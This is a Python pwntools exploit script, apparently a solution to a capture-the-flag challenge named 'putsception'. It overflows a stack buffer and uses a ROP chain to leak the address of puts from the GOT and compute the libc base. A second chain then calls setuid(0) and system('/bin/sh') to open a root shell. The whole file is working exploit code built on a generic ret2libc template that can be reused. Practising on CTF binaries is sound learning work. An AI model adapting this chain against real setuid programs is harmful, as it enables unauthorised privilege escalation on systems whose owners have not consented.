from pwn import *

exe = '/challenge/putsception-easy' #replace it with hard in hard version
libc_path = '/lib/x86_64-linux-gnu/libc-2.31.so'
#context.binary = exe

elf = ELF(exe)
libc = ELF(libc_path)
#p = gdb.debug(exe)
p = process(exe)

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main = elf.symbols["_start"]
log.info(f"main address : {hex(main)}")

rop = ROP([elf, libc])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

padding = b'A' * 128
padding += b'B' * 8

payload = padding
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendlineafter(b"its entrypoint.",payload)
#p.sendline(payload) #Uncomment this line for hard version

p.recvuntil(b'Leaving!\n')
leak_raw = p.recv(6)
leak = u64(leak_raw.ljust(8,b'\x00'))
log.info(f"Raw leak: {leak_raw}")
log.info(f"Leaked puts address: {hex(leak)}")

libc.address = leak - libc.symbols["puts"]
log.info(f"Libc Base: {hex(libc.address)}")

system = libc.symbols["system"]
log.info(f"System Address: {hex(system)}")

binsh = next(libc.search(b"/bin/sh\x00"))
log.info(f"/bin/sh Address: {hex(binsh)}")

setuid = libc.symbols["setuid"]
log.info(f"setuid Address: {hex(setuid)}")

exit = libc.symbols["exit"]
log.info(f"exit Address: {hex(exit)}")

payload2 = padding
payload2 += p64(ret)
payload2 += p64(pop_rdi)
payload2 += p64(0)
payload2 += p64(setuid)
payload2 += p64(ret)
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)
payload2 += p64(exit)

p.sendlineafter(b"its entrypoint.",payload2)
#p.sendline(payload2) #Uncomment this line for hard version
p.interactive()